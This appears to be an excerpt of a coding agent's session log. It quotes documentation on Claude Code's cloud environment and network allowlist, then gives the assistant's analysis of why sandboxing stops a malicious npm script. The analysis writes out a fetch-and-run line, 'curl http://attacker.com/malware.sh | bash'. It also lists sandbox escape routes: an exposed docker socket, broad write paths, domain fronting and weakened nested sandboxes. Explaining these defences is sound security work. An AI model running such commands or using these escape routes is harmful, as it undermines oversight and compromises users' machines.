verifies you're in the correct repository, fetches and checks out the branch from the remote session, and loads the full conversation history into your terminal.\n\n#### Requirements for teleporting\n\nTeleport checks these requirements before resuming a session. If any requirement isn't met, you'll see an error or be prompted to resolve the issue.\n\n| Requirement        | Details                                                                                                                |\n| ------------------ | ---------------------------------------------------------------------------------------------------------------------- |\n| Clean git state    | Your working directory must have no uncommitted changes. Teleport prompts you to stash changes if needed.              |\n| Correct repository | You must run `--teleport` from a checkout of the same repository, not a fork.                                          |\n| Branch available   | The branch from the web session must have been pushed to the remote. Teleport automatically fetches and checks it out. |\n| Same account       | You must be authenticated to the same Claude.ai account used in the web session.                                       |\n\n### Sharing sessions\n\nTo share a session, toggle its visibility according to the account\ntypes below. After that, share the session link as-is. Recipients who open your\nshared session will see the latest state of the session upon load, but the\nrecipient's page will not update in real time.\n\n#### Sharing from an Enterprise or Teams account\n\nFor Enterprise and Teams accounts, the two visibility options are **Private**\nand **Team**. Team visibility makes the session visible to other members of your\nClaude.ai organization. Repository access verification is enabled by default,\nbased on the GitHub account connected to the recipient's account. Your account's\ndisplay name is visible to all recipients with access. [Claude in Slack](/en/slack)\nsessions are automatically shared with Team visibility.\n\n#### Sharing from a Max or Pro account\n\nFor Max and Pro accounts, the two visibility options are **Private**\nand **Public**. Public visibility makes the session visible to any user logged\ninto claude.ai.\n\nCheck your session for sensitive content before sharing. Sessions may contain\ncode and credentials from private GitHub repositories. Repository access\nverification is not enabled by default.\n\nEnable repository access verification and/or withhold your name from your shared\nsessions by going to Settings > Claude Code > Sharing settings.\n\n## Cloud environment\n\n### Default image\n\nWe build and maintain a universal image with common toolchains and language ecosystems pre-installed. This image includes:\n\n* Popular programming languages and runtimes\n* Common build tools and package managers\n* Testing frameworks and linters\n\n#### Checking available tools\n\nTo see what's pre-installed in your environment, ask Claude Code to run:\n\n```bash  theme={null}\ncheck-tools\n```\n\nThis command displays:\n\n* Programming languages and their versions\n* Available package managers\n* Installed development tools\n\n#### Language-specific setups\n\nThe universal image includes pre-configured environments for:\n\n* **Python**: Python 3.x with pip, poetry, and common scientific libraries\n* **Node.js**: Latest LTS versions with npm, yarn, pnpm, and bun\n* **Ruby**: Versions 3.1.6, 3.2.6, 3.3.6 (default: 3.3.6) with gem, bundler, and rbenv for version management\n* **PHP**: Version 8.4.14\n* **Java**: OpenJDK with Maven and Gradle\n* **Go**: Latest stable version with module support\n* **Rust**: Rust toolchain with cargo\n* **C++**: GCC and Clang compilers\n\n#### Databases\n\nThe universal image includes the following databases:\n\n* **PostgreSQL**: Version 16\n* **Redis**: Version 7.0\n\n### Environment configuration\n\nWhen you start a session in Claude Code on the web, here's what happens under the hood:\n\n1. **Environment preparation**: We clone your repository and run any configured Claude hooks for initialization. The repo will be cloned with the default branch on your GitHub repo. If you would like to check out a specific branch, you can specify that in the prompt.\n\n2. **Network configuration**: We configure internet access for the agent. Internet access is limited by default, but you can configure the environment to have no internet or full internet access based on your needs.\n\n3. **Claude Code execution**: Claude Code runs to complete your task, writing code, running tests, and checking its work. You can guide and steer Claude throughout the session via the web interface. Claude respects context you've defined in your `CLAUDE.md`.\n\n4. **Outcome**: When Claude completes its work, it will push the branch to remote. You will be able to create a PR for the branch.\n\n<Note>\n  Claude operates entirely through the terminal and CLI tools available in the environment. It uses the pre-installed tools in the universal image and any additional tools you install through hooks or dependency management.\n</Note>\n\n**To add a new environment:** Select the current environment to open the environment selector, and then select \"Add environment\". This will open a dialog where you can specify the environment name, network access level, and any environment variables you want to set.\n\n**To update an existing environment:** Select the current environment, to the right of the environment name, and select the settings button. This will open a dialog where you can update the environment name, network access, and environment variables.\n\n**To select your default environment from the terminal:** If you have multiple environments configured, run `/remote-env` to choose which one to use when starting web sessions from your terminal with `&` or `--remote`. With a single environment, this command shows your current configuration.\n\n<Note>\n  Environment variables must be specified as key-value pairs, in [`.env` format](https://www.dotenv.org/). For example:\n\n  ```\n  API_KEY=your_api_key\n  DEBUG=true\n  ```\n</Note>\n\n### Dependency management\n\nCustom environment images and snapshots are not yet supported. As a workaround, you can use [SessionStart hooks](/en/hooks#sessionstart) to install packages when a session starts. This approach has [known limitations](#dependency-management-limitations).\n\nTo configure automatic dependency installation, add a SessionStart hook to your repository's `.claude/settings.json` file:\n\n```json  theme={null}\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"matcher\": \"startup\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"\\\"$CLAUDE_PROJECT_DIR\\\"/scripts/install_pkgs.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nCreate the corresponding script at `scripts/install_pkgs.sh`:\n\n```bash  theme={null}\n#!/bin/bash\n\n# Only run in remote environments\nif [ \"$CLAUDE_CODE_REMOTE\" != \"true\" ]; then\n  exit 0\nfi\n\nnpm install\npip install -r requirements.txt\nexit 0\n```\n\nMake it executable: `chmod +x scripts/install_pkgs.sh`\n\n#### Persist environment variables\n\nSessionStart hooks can persist environment variables for subsequent Bash commands by writing to the file specified in the `CLAUDE_ENV_FILE` environment variable. For details, see [SessionStart hooks](/en/hooks#sessionstart) in the hooks reference.\n\n#### Dependency management limitations\n\n* **Hooks fire for all sessions**: SessionStart hooks run in both local and remote environments. There is no hook configuration to scope a hook to remote sessions only. To skip local execution, check the `CLAUDE_CODE_REMOTE` environment variable in your script as shown above.\n* **Requires network access**: Install commands need network access to reach package registries. If your environment is configured with \"No internet\" access, these hooks will fail. Use \"Limited\" (the default) or \"Full\" network access. The [default allowlist](#default-allowed-domains) includes common registries like npm, PyPI, RubyGems, and crates.io.\n* **Proxy compatibility**: All outbound traffic in remote environments passes through a [security proxy](#security-proxy). Some package managers do not work correctly with this proxy. Bun is a known example.\n* **Runs on every session start**: Hooks run each time a session starts or resumes, adding startup latency. Keep install scripts fast by checking whether dependencies are already present before reinstalling.\n\n## Network access and security\n\n### Network policy\n\n#### GitHub proxy\n\nFor security, all GitHub operations go through a dedicated proxy service that transparently handles all git interactions. Inside the sandbox, the git client authenticates using a custom-built scoped credential. This proxy:\n\n* Manages GitHub authentication securely - the git client uses a scoped credential inside the sandbox, which the proxy verifies and translates to your actual GitHub authentication token\n* Restricts git push operations to the current working branch for safety\n* Enables seamless cloning, fetching, and PR operations while maintaining security boundaries\n\n#### Security proxy\n\nEnvironments run behind an HTTP/HTTPS network proxy for security and abuse prevention purposes. All outbound internet traffic passes through this proxy, which provides:\n\n* Protection against malicious requests\n* Rate limiting and abuse prevention\n* Content filtering for enhanced security\n\n### Access levels\n\nBy default, network access is limited to [allowlisted domains](#default-allowed-domains).\n\nYou can configure custom network access, including disabling network access.\n\n### Default allowed domains\n\nWhen using \"Limited\" network access, the following domains are allowed by default:\n\n#### Anthropic Services\n\n* api.anthropic.com\n* statsig.anthropic.com\n* platform.claude.com\n* code.claude.com\n* claude.ai\n\n#### Version Control\n\n* github.com\n* [www.github.com](http://www.github.com)\n* api.github.com\n* npm.pkg.github.com\n* raw\\.githubusercontent.com\n* pkg-npm.githubusercontent.com\n* objects.githubusercontent.com\n* codeload.github.com\n* avatars.githubusercontent.com\n* camo.githubusercontent.com\n* gist.github.com\n* gitlab.com\n* [www.gitlab.com](http://www.gitlab.com)\n* registry.gitlab.com\n* bitbucket.org\n* [www.bitbucket.org](http://www.bitbucket.org)\n* api.bitbucket.org\n\n#### Container Registries\n\n* registry-1.docker.io\n* auth.docker.io\n* index.docker.io\n* hub.docker.com\n* [www.docker.com](http://www.docker.com)\n* production.cloudflare.docker.com\n* download.docker.com\n* gcr.io\n* \\*.gcr.io\n* ghcr.io\n* mcr.microsoft.com\n* \\*.data.mcr.microsoft.com\n* public.ecr.aws\n\n#### Cloud Platforms\n\n* cloud.google.com\n* accounts.google.com\n* gcloud.google.com\n* \\*.googleapis.com\n* storage.googleapis.com\n* compute.googleapis.com\n* container.googleapis.com\n* azure.com\n* portal.azure.com\n* microsoft.com\n* [www.microsoft.com](http://www.microsoft.com)\n* \\*.microsoftonline.com\n* packages.microsoft.com\n* dotnet.microsoft.com\n* dot.net\n* visualstudio.com\n* dev.azure.com\n* \\*.amazonaws.com\n* \\*.api.aws\n* oracle.com\n* [www.oracle.com](http://www.oracle.com)\n* java.com\n* [www.java.com](http://www.java.com)\n* java.net\n* [www.java.net](http://www.java.net)\n* download.oracle.com\n* yum.oracle.com\n\n#### Package Managers -

Authentication is handled through a secure proxy using scoped credentials\n* **Secure analysis**: Code is analyzed and modified within isolated VMs before creating PRs\n\n## Pricing and rate limits\n\nClaude Code on the web shares rate limits with all other Claude and Claude Code usage within your account. Running multiple tasks in parallel will consume more rate limits proportionately.\n\n## Limitations\n\n* **Repository authentication**: You can only move sessions from web to local when you are authenticated to the same account\n* **Platform restrictions**: Claude Code on the web only works with code hosted in GitHub. GitLab and other non-GitHub repositories cannot be used with cloud sessions\n\n## Best practices\n\n1. **Use Claude Code hooks**: Configure [SessionStart hooks](/en/hooks#sessionstart) to automate environment setup and dependency installation.\n2. **Document requirements**: Clearly specify dependencies and commands in your `CLAUDE.md` file. If you have an `AGENTS.md` file, you can source it in your `CLAUDE.md` using `@AGENTS.md` to maintain a single source of truth.\n\n## Related resources\n\n* [Hooks configuration](/en/hooks)\n* [Settings reference](/en/settings)\n* [Security](/en/security)\n* [Data usage](/en/data-usage)\n"}]},"uuid":"04f209f6-c9d5-426a-b2c0-9d00bb134d51","timestamp":"2026-02-16T23:48:14.994Z","sourceToolAssistantUUID":"286228b8-d22a-45d9-ae0c-9efc9076e205"}

Modify `package.json` to include malicious code in a script\n2. Run `npm run <script>` \n3. Execute code with full user permissions outside the sandbox\n\n**This attack is NOT possible due to OS-level enforcement of sandbox boundaries on child processes.**\n\n---\n\n## How the Sandboxing Actually Works\n\n### 1. Child Process Inheritance - YES, All Subprocesses Are Sandboxed\n\nThe documentation explicitly states:\n\n> \"These OS-level restrictions ensure that all child processes spawned by Claude Code's commands inherit the same security boundaries.\"\n\n**Platform-specific enforcement:**\n\n- **macOS**: Uses Apple's Seatbelt sandbox framework. All child processes inherit the sandbox profile\n- **Linux/WSL2**: Uses `bubblewrap` for containerization. All spawned processes run within the same container namespace\n- **WSL1**: Not supported because `bubblewrap` requires kernel namespaces\n\nThis is a critical architectural point: **the sandbox is enforced at the OS kernel level, not at the application level**. When Claude runs `npm run build`, the `npm` process and everything it spawns (Node.js interpreter, build scripts, nested subprocesses) all execute within the same sandbox boundary.\n\n### 2. Filesystem Isolation - Prevents Malicious Script Execution\n\nEven if a subprocess somehow escaped the Seatbelt/bubblewrap enforcement (which it cannot), the filesystem isolation would prevent the attack:\n\n**Default write behavior:**\n- Write access restricted to current working directory and subdirectories\n- Cannot modify files outside the project directory\n- Cannot write to system directories like `/bin/`, `/usr/local/bin/`, etc.\n\n**Blocked critical paths:**\n- Cannot modify shell configuration files (`~/.bashrc`, `~/.zshrc`)\n- Cannot modify system executables\n- Cannot write to paths specified in deny rules\n\nEven if a compromised subprocess tried to escalate via modifying `~/.bashrc` or system binaries, the sandbox would block the write operation at the OS level.\n\n### 3. Network Isolation - Prevents Data Exfiltration\n\nNetwork access is controlled through a proxy running **outside the sandbox**:\n\n- All outbound network traffic from child processes routes through this proxy\n- Unapproved domains are blocked at the OS level\n- The proxy cannot be bypassed by subprocess attempts (it's enforced by kernel namespaces on Linux/Seatbelt on macOS)\n\nFrom the documentation:\n\n> \"Network access is controlled through a proxy server running outside the sandbox... Restrictions apply to all scripts, programs, and subprocesses spawned by commands\"\n\n---\n\n## Security Layers - Defense in Depth\n\n### Layer 1: Permission System (Application-Level)\n- Claude must have `Bash(npm run *)` permission before running any npm script\n- This is evaluated before the bash tool executes\n\n### Layer 2: Filesystem Isolation (OS-Level)\n- Enforced by Seatbelt (macOS) or bubblewrap (Linux/WSL2)\n- Child processes cannot write outside the sandbox boundary\n- Cannot read denied files\n\n### Layer 3: Network Isolation (OS-Level + Proxy)\n- Child process network connections route through external proxy\n- Kernel-level enforcement prevents direct network access\n- Even if a child process tries to open a socket, it's blocked by the OS\n\n### Layer 4: Intent Analysis\n- Suspicious bash commands require manual approval even if pre-allowlisted\n- Command injection detection analyzes command structure\n\n---\n\n## Known Limitations and Escape Scenarios\n\nThe documentation explicitly details where escapes ARE theoretically possible:\n\n### 1. **Privilege Escalation via Unix Sockets**\nIf you allow Unix socket access via `allowUnixSockets` configuration:\n```json\n{\n  \"sandbox\": {\n    \"allowUnixSockets\": [\"/var/run/docker.sock\"]\n  }\n}\n```\n\nThen a subprocess **could** exploit the docker socket to escape. The documentation warns:\n\n> \"if it is used to allow access to `/var/run/docker.sock` this would effectively grant access to the host system through exploiting the docker socket\"\n\n**Your scenario doesn't use unix sockets, so this doesn't apply.**\n\n### 2. **Filesystem Permission Escalation**\nIf write permissions are configured too broadly (e.g., allowing writes to `$PATH` directories):\n```json\n{\n  \"sandbox\": {\n    \"allowedWritePaths\": [\"/usr/local/bin\"]\n  }\n}\n```\n\nThen a subprocess could theoretically write to system directories. But **default configuration prevents this** - write access is restricted to the project directory.\n\n### 3. **Domain Fronting via Network Proxy**\nThe proxy doesn't inspect traffic content, only domain rules. A process could theoretically use domain fronting to bypass domain restrictions. However:\n\n> \"it may be possible to bypass the network filtering through [domain fronting](https://en.wikipedia.org/wiki/Domain_fronting)\"\n\nThis requires network access to be allowed in the first place, and only affects data exfiltration, not sandbox escape.\n\n### 4. **Linux Nested Sandbox Weakening**\nWhen running in Docker, the `enableWeakerNestedSandbox` mode can be enabled for compatibility:\n\n> \"This option considerably weakens security and should only be used in cases where additional isolation is otherwise enforced\"\n\nBut this is an opt-in configuration and explicitly documented as weaker.\n\n---\n\n## Your Specific Attack Chain: Why It Fails\n\nLet's trace your exact scenario:\n\n1. **Edit package.json**: `npm install && curl http://attacker.com/malware.sh | bash`\n   - Allowed by default (file editing within project directory)\n\n2. **Run `npm run <script>`**: Claude would need `Bash(npm run *)` permission\n   - Permission system may ask for approval first\n   - Sandboxed environment receives the bash command\n\n3. **npm spawns child processes**: \n   - All npm subprocesses run within Seatbelt/bubblewrap boundary\n   - Cannot escape OS-level sandbox enforcement\n\n4. **curl tries to reach attacker.com**:\n   - Network request routes through proxy\n   - Domain is not allowlisted (unlikely to be)\n   - Request is blocked at OS level, never reaches attacker's server\n   - No malware payload is downloaded\n\n5. **Bash fails to execute**:\n   - No malware to execute anyway (network was blocked)\n   - Even if downloaded, subprocess runs sandboxed\n\n---\n\n## Summary: Why Your Attack Vector Doesn't Work\n\n| Attack Stage | Defense | Enforcement Level |\n|---|---|---|\n| Modify package.json | Filesystem isolation (project dir only) | OS-level |\n| Execute npm run | Permission system + command analysis | Application + OS |\n| npm spawns subprocesses | Child processes inherit sandbox | OS-level (namespaces/Seatbelt) |\n| Subprocess network request | Proxy blocks unapproved domains | Proxy + kernel enforcement |\n| Subprocess file write | Filesystem boundary prevents writes | OS-level |\n| Privilege escalation | Default config disallows unix sockets | Configuration policy |\n\n**The critical point**: The sandbox is enforced at the **OS kernel level**, not the application level. All child processes run within the same sandboxed namespace (Linux) or under the same Seatbelt profile (macOS). They cannot escape regardless of how clever the subprocess is.\n\n---\n\n## References\n\n- **Sandboxing documentation**: https://code.claude.com/docs/en/sandboxing.md - Detailed technical information on OS-level enforcement\n- **Security documentation**: https://code.claude.com/docs/en/security.md - Comprehensive security architecture\n- **Permissions documentation**: https://code.claude.com/docs/en/permissions.md - Application-level permission controls\n- **Open source implementation**: https://github.com/anthropic-experimental/sandbox-runtime\n\nThe sandbox runtime is open source and available at the GitHub repository above for independent review of the implementation."}],"stop_reason":null,"stop_sequence":null,"usage":{"input_tokens":6,"cache_creation_input_tokens":6223,"cache_read_input_tokens":31930,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":6223},"output_tokens":1,"service_tier":"standard","inference_geo":"not_available"}},"requestId":"req_011CYCeBE32yKxNX9gy5U1mQ","type":"assistant","uuid":"4185182e-7e1e-4042-8736-b4e22f5be5d3","timestamp":"2026-02-16T23:48:36.502Z"}
